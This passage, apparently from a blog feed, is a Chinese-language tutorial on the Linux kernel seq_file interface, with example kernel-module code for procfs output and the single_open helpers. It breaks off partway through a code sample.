  </entry>
  
  <entry>
    <title>【OS.0x05】Linux 内核文件系统 - 初探序列文件接口</title>
    <link href="https://arttnba3.github.io/2024/05/31/OS-0X05-LINUX-KERNEL-FILESYSTEM-SEQFILE/"/>
    <id>https://arttnba3.github.io/2024/05/31/OS-0X05-LINUX-KERNEL-FILESYSTEM-SEQFILE/</id>
    <published>2024-05-30T21:36:25.000Z</published>
    <updated>2024-06-02T21:43:13.233Z</updated>
    
    <content type="html"><![CDATA[<p>真是序序又列列啊，你们有没有这样的文件接口啊我想问</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p>笔者大二上那会学 kernel pwn 时便经常在用户态用到序列文件接口，不过在那个时候笔者只关心打开 <code>/proc/self/stat</code> 文件便能分配一个 <code>kmalloc-32</code> 对象（<code>seq_operations</code> ）；大二下写 Linux kernel rootkit 时又碰到 <code>/proc/kallsyms</code> 无法在内核层读取的问题，不过也是了解了一下序列文件接口的相关知识就没有再继续深入了（<del>不过这个东西本来就很简约，就其本身而言确实没有什么能够深入的地方</del>）</p><p>刚好笔者最近的工作又接触到了这个玩意，所以简单写一篇博客记录一下这是个什么玩意：）</p><h1 id="0x01-序列文件接口-简介"><a href="#0x01-序列文件接口-简介" class="headerlink" title="0x01. 序列文件接口 - 简介"></a>0x01. 序列文件接口 - 简介</h1><p><a href="https://docs.kernel.org/filesystems/seq_file.html">序列文件接口</a> 是在现有 VFS 上建立的一套用于 <strong>从内核空间向用户空间提供传输序列数据</strong> 的接口，这里我们将序列数据简单定义为 <strong>由多条数据组成的数据</strong> （例如 <code>/proc/kallsyms</code> 为用户提供了多条内核符号信息数据），这个场景下内核通常需要多次迭代地向用户空间拷贝多条数据</p><p>序列文件接口的设计主要出于一个原因：<strong>【大于一页的文件操作对于开发者而言非常麻烦】</strong> ，我们要从内核空间向用户空间传递数据通常需要自行创建如 <code>procfs</code> 等节点并自定义一份 <code>file_operations</code> ，开发者能用的只有一个裸的 <code>read(struct file *, char __user *, size_t, loff_t *)</code> ，而对于这类功能比较单一的场景， <em>设计上要考虑的和常规的文件接口相比却一个都不能少</em> （跨页多条数据拷贝的文件偏移处理确实不是个小问题），这增大了开发者的开发难度，但序列数据的传输在内核开发中其实又是一个非常常见的场景</p><p>由此，针对此类场景，序列文件接口应运而生，<strong>为上层开发者提供了类似【迭代器】的简易文件读取接口</strong> ，由此极大地简化了对于此类场景的内核开发工作</p><blockquote><p>本篇博客使用的内核源码为 6.9.1</p></blockquote><h2 id="序列文件接口开发：操作函数"><a href="#序列文件接口开发：操作函数" class="headerlink" title="序列文件接口开发：操作函数"></a>序列文件接口开发：操作函数</h2><p>要使用序列文件接口，我们需要实现一个 <code>seq_operations</code> 函数表：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/seq_file.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> &#123;</span><br><span class="hljs-type">void</span> * (*start) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">loff_t</span> *pos);<br><span class="hljs-type">void</span> (*stop) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v);<br><span class="hljs-type">void</span> * (*next) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v, <span class="hljs-type">loff_t</span> *pos);<br><span class="hljs-type">int</span> (*show) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v);<br>&#125;;<br></code></pre></td></tr></table></figure><p>各函数指针说明如下（<strong>按照被调用顺序</strong>）：</p><ul><li><code>start</code> ：在开始读取序列数据前进行初始化工作，并返回指定偏移上的序列数据对象</li><li><code>show</code> ：打印传入的序列数据对象，该函数会被循环调用</li><li><code>next</code> ： 根据传入的偏移值与当前对象获取下一个序列数据对象，并自增偏移值，该函数会被循环调用</li><li><code>stop</code> ：在完成对序列文件的遍历后用以进行需要的收尾工作，可以为空函数</li></ul><p>需要注意的是，这里所说的偏移值通常指的 <strong>其实是序列数据对象的索引值</strong> ，而非基于具体内存对象大小计算的值</p><p>除了 <code>seq_operations</code> 函数表以外，序列文件接口对于每个文件还会额外分配一个 <code>seq_file</code> 结构体（在 open() 时分配到 <code>file-&gt;private</code> ）用以存储如当前的读取偏移、整个序列的长度等数据：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_file</span> &#123;</span><br><span class="hljs-type">char</span> *buf;<br><span class="hljs-type">size_t</span> size;<br><span class="hljs-type">size_t</span> from;<br><span class="hljs-type">size_t</span> count;<br><span class="hljs-type">size_t</span> pad_until;<br><span class="hljs-type">loff_t</span> index;<br><span class="hljs-type">loff_t</span> read_pos;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">lock</span>;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> *<span class="hljs-title">op</span>;</span><br><span class="hljs-type">int</span> poll_event;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">file</span>;</span><br><span class="hljs-type">void</span> *private;<br>&#125;;<br></code></pre></td></tr></table></figure><p>核心的字段说明如下：</p><ul><li><code>buf</code> ：临时存放由 <code>show()</code> 打印的数据，通常为单张内存页大小，数据会先被拷贝到这块内存上再拷贝回用户空间</li><li><code>size</code> ：<code>buf</code> 的总大小</li><li><code>from</code>：<code>buf</code> 当前数据写入的起始偏移</li><li><code>count</code> ：<code>buf</code> 已经写入的大小，<strong>序列文件上的有效待写入数据为</strong> <code>&amp;seq_file::buf[seq_file::from]</code> <strong>起始的长度为</strong> <code>seq_file::count</code> <strong>的区域</strong> ，通常每一轮读取都会刷新一次 <code>count</code> 字段</li><li><code>index</code> ： 当前正在读取的对象的偏移值</li><li><code>read_pos</code> ：成功读取的数据量（字节）</li><li><code>op</code> ：序列文件接口的函数表 <del>其实是指玩原神的人</del> </li><li><code>file</code> ：对应的 VFS file 节点</li><li><code>private</code> ：供上层开发者存放私人数据</li></ul><p>下面我们以一个基础的链表结构作为示例说明如何基于序列文件接口进行基本的开发：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a3_seq_data</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">list</span>;</span><br>    <span class="hljs-type">char</span> data[<span class="hljs-number">0x100</span>];<br>&#125;;<br><br>LIST_HEAD(a3_seq_list);<br></code></pre></td></tr></table></figure><h3 id="start-：序列文件读取初始化"><a href="#start-：序列文件读取初始化" class="headerlink" title="start()：序列文件读取初始化"></a>start()：序列文件读取初始化</h3><p>内核将单次 <code>read()</code> 系统调用读取的过程称之为一个 <code>session</code> ，在每个 session 开始时都会调用序列文件接口的 <code>start()</code> 函数以进行初始化，核心作用是 <strong>在读取开始时获取指定偏移值上的对象作为起始点</strong> ，我们通常需要返回<strong>指定偏移上的序列数据对象</strong></p><p>在现代内核及驱动开发场景中 <code>start()</code> 所获取到的通常是第一个序列数据对象，这也是序列文件接口的规范用法， <em>因为大部分情况下开发者并不需要处理偏移值不为 0 的场景</em> ，因此也可以简单返回一个  <code>SEQ_START_TOKEN</code>  （值为 1）</p><blockquote><p>该值用于在 <code>next()</code> 与 <code>show()</code> 中<strong>供你自己进行识别</strong>，所以只要你认得就行</p></blockquote><p>对于读取到末尾的情况（偏移值超出范围）， <strong>通常直接返回 NULL 即可</strong> ，对于初始化失败的场景，我们还可以返回一个 <code>ERR_PTR</code> 类型值进行说明</p><p>以下是我们的示例代码，这里我们简单地返回链表上指定偏移的对象：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span>* <span class="hljs-title function_">a3kmod_seq_start</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">loff_t</span> *ppos)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a3_seq_data</span> *<span class="hljs-title">ptr</span>;</span><br>    <span class="hljs-type">loff_t</span> cpos = <span class="hljs-number">0</span>;<br><br>    list_for_each_entry(ptr, &amp;a3_seq_list, <span class="hljs-built_in">list</span>) &#123;<br>        <span class="hljs-keyword">if</span> (cpos == (*ppos)) &#123;<br>            <span class="hljs-keyword">return</span> ptr;<br>        &#125;<br><br>        cpos++;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="show-：打印指定的序列数据"><a href="#show-：打印指定的序列数据" class="headerlink" title="show()：打印指定的序列数据"></a>show()：打印指定的序列数据</h3><p><code>show()</code> 函数用于将当前序列对象需要被导出的数据通过序列文件的打印接口拷贝到指定的临时内存（即 <code>seq_file::buf</code> ）上，这些数据会在多次遍历完成后（buf 满了或者序列遍历完成）统一拷贝到用户空间，可用的接口通常有：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* print data directly */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">seq_printf</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *fmt, ...)</span>; <span class="hljs-comment">/* mostly used */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">seq_putc</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">char</span> c)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">seq_puts</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *s)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">seq_escape</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *s, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *esc)</span>;<br><span class="hljs-comment">/* print file path */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">seq_path</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> path *path,</span><br><span class="hljs-params">             <span class="hljs-type">const</span> <span class="hljs-type">char</span> *esc)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">seq_path_root</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> path *path,</span><br><span class="hljs-params">                  <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> path *root, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *esc)</span><br></code></pre></td></tr></table></figure><p>正常打印完成需要返回 0，返回小于 0 的值表示出错，返回大于 0 的值（ <code>SEQ_SKIP</code> ）表示跳过该项，以下是我们的示例代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3kmod_seq_show</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a3_seq_data</span> *<span class="hljs-title">data</span> =</span> v;<br><br>    seq_printf(m, <span class="hljs-string">&quot;[a3kmod_data] data: %s\n&quot;</span>, data-&gt;data);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="next-：获取指定偏移上的序列数据，自增偏移值"><a href="#next-：获取指定偏移上的序列数据，自增偏移值" class="headerlink" title="next()：获取指定偏移上的序列数据，自增偏移值"></a>next()：获取指定偏移上的序列数据，自增偏移值</h3><p><code>next()</code> 函数用以 <strong>根据传入的偏移值获取下一个序列数据对象，并更新偏移值</strong> ，在单次 session 中会迭代地调用 <code>next()</code> 函数，直到当前数据页无法继续装载，或是已经读取完序列上所有的数据</p><p>在 <code>next()</code> 函数当中，我们需要更新上层的 index （通常直接 <code>+1</code> 即可），并返回下一个序列数据对象，以下是我们的示例代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span>* <span class="hljs-title function_">a3kmod_seq_next</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v, <span class="hljs-type">loff_t</span> *ppos)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a3_seq_data</span> *<span class="hljs-title">ptr</span> =</span> v;<br><br>    (*ppos)++;<br><br>    ptr = list_next_entry(ptr, <span class="hljs-built_in">list</span>);<br>    <span class="hljs-keyword">if</span> (unlikely(list_entry_is_head(ptr, &amp;a3_seq_list, <span class="hljs-built_in">list</span>))) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> ptr;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="stop-：序列文件关闭清理"><a href="#stop-：序列文件关闭清理" class="headerlink" title="stop()：序列文件关闭清理"></a>stop()：序列文件关闭清理</h3><p><code>stop()</code> 函数用于在单个 session 结束时进行一些自定义的需要的清理工作，因此通常也可以只是一个空函数，以下是我们的示例代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3kmod_seq_stop</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v)</span><br>&#123;<br>    <span class="hljs-comment">/* do nothing */</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="序列文件接口开发：初始化"><a href="#序列文件接口开发：初始化" class="headerlink" title="序列文件接口开发：初始化"></a>序列文件接口开发：初始化</h2><p>完成了序列文件接口四个函数的定义后，接下来我们需要在创建通用 VFS 节点时进行初始化，主要就是定义四个通用函数：</p><ul><li><code>open()</code> ：该函数中我们需要调用 <code>seq_open()</code> 进行初始化，其会分配一个 <code>seq_file</code> 结构体存放到 <code>file-&gt;private</code> ，我们也可以使用 <code>__seq_open_private()</code> （等价于多一次 kmalloc() 分配自定义数据对象）</li><li>二选一：<ul><li><code>read()</code> ：该函数指针需要被初始化为 <code>seq_read()</code> ，但你也可以再套个 wrapper</li><li><code>read_iter()</code> ：该函数指针需要被初始化为 <code>seq_read_iter()</code> ，但你也可以再套个 wrapper</li></ul></li><li><code>lseek()</code> ：该函数指针需要被初始化为 <code>seq_lseek()</code> ，但你也可以再套个 wrapper</li><li><code>release()</code> ：该函数指针需要被初始化为 <code>seq_release()</code> ，但你也可以再套个 wrapper</li></ul><p>之后像往常一样初始化文件接口即可，对序列文件接口的操作都会直接通过这些 <code>seq_*</code> API 完成，这极大地简化了开发者的工作，以下是我们以 <code>procfs</code> 为例的示例代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> <span class="hljs-title">a3kmod_seq_ops</span> =</span> &#123;<br>    .start  = a3kmod_seq_start,<br>    .show   = a3kmod_seq_show,<br>    .next   = a3kmod_seq_next,<br>    .stop   = a3kmod_seq_stop,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3kmod_open</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> inode *i, <span class="hljs-keyword">struct</span> file *f)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> seq_open(f, &amp;a3kmod_seq_ops);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_ops</span> <span class="hljs-title">a3kmod_ops</span> =</span> &#123;<br>    .proc_open      = a3kmod_open,<br>    .proc_read      = seq_read,<br>    <span class="hljs-comment">//.proc_read_iter = seq_read_iter, /* it&#x27;s also okay! */</span><br>    .proc_lseek     = seq_lseek,<br>    .proc_release   = seq_release,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3kmod_release_data_list</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a3_seq_data</span> *<span class="hljs-title">cur</span>, *<span class="hljs-title">next</span>;</span><br><br>    list_for_each_entry_safe(cur, next, &amp;a3_seq_list, <span class="hljs-built_in">list</span>) &#123;<br>        list_del(&amp;cur-&gt;<span class="hljs-built_in">list</span>);<br>        kfree(cur);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">a3kmod_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a3_seq_data</span> *<span class="hljs-title">data</span>;</span><br><br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Hello to kernel space!\n&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++) &#123;<br>        data = kmalloc(<span class="hljs-keyword">sizeof</span>(*data), GFP_KERNEL);<br>        <span class="hljs-keyword">if</span> (!data) &#123;<br>            printk(KERN_ERR <span class="hljs-string">&quot;[a3kmod:] FAILED to alloc data!\n&quot;</span>);<br>            a3kmod_release_data_list();<br>            <span class="hljs-keyword">return</span> -ENOMEM;<br>        &#125;<br><br>        <span class="hljs-built_in">sprintf</span>(data-&gt;data, <span class="hljs-string">&quot;arttnba3 - no.%.2d data&quot;</span>, i);<br>        list_add_tail(&amp;data-&gt;<span class="hljs-built_in">list</span>, &amp;a3_seq_list);<br>    &#125;<br>    <br>    <span class="hljs-keyword">if</span> (!proc_create(<span class="hljs-string">&quot;a3kmod&quot;</span>, <span class="hljs-number">0666</span>, <span class="hljs-literal">NULL</span>, &amp;a3kmod_ops)) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3kmod:] FAILED to create procfs interface!\n&quot;</span>);<br>        a3kmod_release_data_list();<br>        <span class="hljs-keyword">return</span> -EACCES;<br>    &#125;<br><br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Initialization done.\n&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __exit <span class="hljs-title function_">a3kmod_exit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Goodbye to kernel space!\n&quot;</span>);<br><br>    a3kmod_release_data_list();<br>    remove_proc_entry(<span class="hljs-string">&quot;a3kmod&quot;</span>, <span class="hljs-literal">NULL</span>);<br>&#125;<br><br>module_init(a3kmod_init);<br>module_exit(a3kmod_exit);<br>MODULE_LICENSE(<span class="hljs-string">&quot;GPL v2&quot;</span>);<br>MODULE_AUTHOR(<span class="hljs-string">&quot;arttnba3&quot;</span>);<br></code></pre></td></tr></table></figure><p>简单测试一下，可以看到内核非常完美地按照我们的需求输出了序列文件数据：</p><p><img src="https://s2.loli.net/2024/06/02/xL3wgmPoT9IUCN7.png"></p><h2 id="序列文件接口开发：single-file（仅单个序列对象读取的简易预实现）"><a href="#序列文件接口开发：single-file（仅单个序列对象读取的简易预实现）" class="headerlink" title="序列文件接口开发：single file（仅单个序列对象读取的简易预实现）"></a>序列文件接口开发：single file（仅单个序列对象读取的简易预实现）</h2><p> <code>/fs/seq_file.c</code> 中除了序列文件接口以外，还有一套已经写好的 <code>single_*</code> 开头的序列文件接口实现，开发者只需要补充实现 <code>show()</code> 函数即可，这通常用于一些并不需要太复杂实现的 <strong>只需要读取一次的</strong> 场景（例如读取 <code>/proc/self/stat</code> ）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">single_start</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *p, <span class="hljs-type">loff_t</span> *pos)</span><br>&#123;<br><span class="hljs-keyword">return</span> *pos ? <span class="hljs-literal">NULL</span> : SEQ_START_TOKEN;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">single_next</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *p, <span class="hljs-type">void</span> *v, <span class="hljs-type">loff_t</span> *pos)</span><br>&#123;<br>++*pos;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">single_stop</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *p, <span class="hljs-type">void</span> *v)</span><br>&#123;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">single_open</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">int</span> (*show)(<span class="hljs-keyword">struct</span> seq_file *, <span class="hljs-type">void</span> *),</span><br><span class="hljs-params"><span class="hljs-type">void</span> *data)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> *<span class="hljs-title">op</span> =</span> kmalloc(<span class="hljs-keyword">sizeof</span>(*op), GFP_KERNEL_ACCOUNT);<br><span class="hljs-type">int</span> res = -ENOMEM;<br><br><span class="hljs-keyword">if</span> (op) &#123;<br>op-&gt;start = single_start;<br>op-&gt;next = single_next;<br>op-&gt;stop = single_stop;<br>op-&gt;show = show;<br>res = seq_open(file, op);<br><span class="hljs-keyword">if</span> (!res)<br>((<span class="hljs-keyword">struct</span> seq_file *)file-&gt;private_data)-&gt;private = data;<br><span class="hljs-keyword">else</span><br>kfree(op);<br>&#125;<br><span class="hljs-keyword">return</span> res;<br>&#125;<br>EXPORT_SYMBOL(single_open);<br></code></pre></td></tr></table></figure><p>使用 single file 实现我们只需要将前面的 <code>seq_open()</code> 替换为 <code>single_open()</code> 并定义一个 <code>show()</code> 即可，注意传给 <code>show()</code> 的序列对象永远都是 NULL ，以下是一个简单的例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/module.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kernel.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/init.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/fs.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/proc_fs.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/seq_file.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a3_data</span> &#123;</span><br>    <span class="hljs-type">char</span> name[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">size_t</span> age;<br>    <span class="hljs-type">size_t</span> money;<br>&#125; a3_info = &#123;<br>    .name   = <span 